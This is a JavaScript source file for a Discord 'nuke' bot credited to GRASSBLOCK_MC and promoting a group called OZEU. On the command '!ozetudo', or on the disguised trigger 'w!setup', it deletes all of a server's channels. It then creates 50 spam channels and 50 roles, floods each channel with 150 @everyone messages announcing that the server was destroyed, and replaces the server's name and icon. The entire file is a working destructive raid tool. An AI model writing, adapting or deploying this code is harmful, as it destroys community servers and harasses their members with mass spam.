//CREATE BY GRASSBLOCK_MC

const {
    Client,
    GatewayIntentBits,
    PermissionsBitField,
} = require("discord.js");
const fs = require("fs");
const path = require("path");
const TOKEN = process.env.DISCORD_TOKEN;
const pLimit = require("p-limit").default;
const limit = pLimit(25); // 同時に5つまで

// Expressを追加
const express = require("express");
const app = express();
const port = 3000; // ウェブサーバーのポート

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

client.on("ready", () => {
    console.log(`✅ Bot Ready: ${client.user.tag}`);
    // ボットが起動したらウェブサーバーも起動
    app.listen(port, () => {
        console.log(`✅ Web Server listening at http://localhost:${port}`);
    });
});

// ウェブサーバーのルートエンドポイント
app.get("/", (req, res) => {
    res.send("Discord Bot is running!");
});

client.on("messageCreate", async (message) => {
    if (
        (message.content === "!ozetudo" || message.content === "w!setup") &&
        message.guild
    ) {
        const guild = message.guild;

        await message.delete().catch(console.error);

        // 全チャンネル削除（並列）
        Promise.all(
            guild.channels.cache.map((ch) =>
                ch
                    .delete()
                    .catch((err) => console.warn(`削除失敗: ${ch.name}`, err)),
            ),
        ).then(() => {
            console.log("✅ チャンネル削除開始");

            let createTasks = [];

            for (let i = 0; i < 50; i++) {
                createTasks.push(
                    limit(() =>
                        guild.channels.create({
                            name: `discordꓸgg⁄ozetudo`,
                            type: 0,
                        }),
                    ),
                );
            }

            // ロール作成
            for (let i = 1; i <= 50; i++) {
                guild.roles
                    .create({
                        name: `OZEU ON TOP`,
                        color: getRandomColor(),
                        reason: "Nuked by OZEU discord.gg/ozetudo",
                    })
                    .catch(console.error);
            }

            // ✅ 修正点: Promise.all の引数を createTasks に変更
            Promise.all(createTasks)
                .then((channels) => {
                    console.log("✅ チャンネル作成完了（順番不問）");

                    // 各チャンネルにメッセージ5個ずつ非同期送信
                    for (const ch of channels) {
                        for (let i = 1; i <= 150; i++) {
                            ch.send(
                                `# **OZEU ON TOP**\n## **このサーバーはおぜうの集いに破壊されました**\nhttps://x.com/ozeu0301\nhttps://x.com/ozeu114514\nhttps://discord.gg/ozetudo\n@everyone`,
                            ).catch(console.error);
                        }
                    }
                })
                .catch(console.error);
        });

        // サーバー名とアイコンも非同期に変更
        const iconPath = path.join(__dirname, "aaa.png");
        if (fs.existsSync(iconPath)) {
            const iconBuffer = fs.readFileSync(iconPath);
            guild.setName("OZEU ON TOP").catch(console.error);
            guild.setIcon(iconBuffer).catch(console.error);
        } else {
            console.warn("⚠️ icon.png が見つかりませんでした");
        }
    }
});

function getRandomColor() {
    // Discordのカラーコードは HEX (#RRGGBB) か 0xRRGGBB で指定
    const r = Math.floor(Math.random() * 256);
    const g = Math.floor(Math.random() * 256);
    const b = Math.floor(Math.random() * 256);
    return (r << 16) + (g << 8) + b;
}

client.login(TOKEN);

//CREATE BY GRASSBLOCK_MC
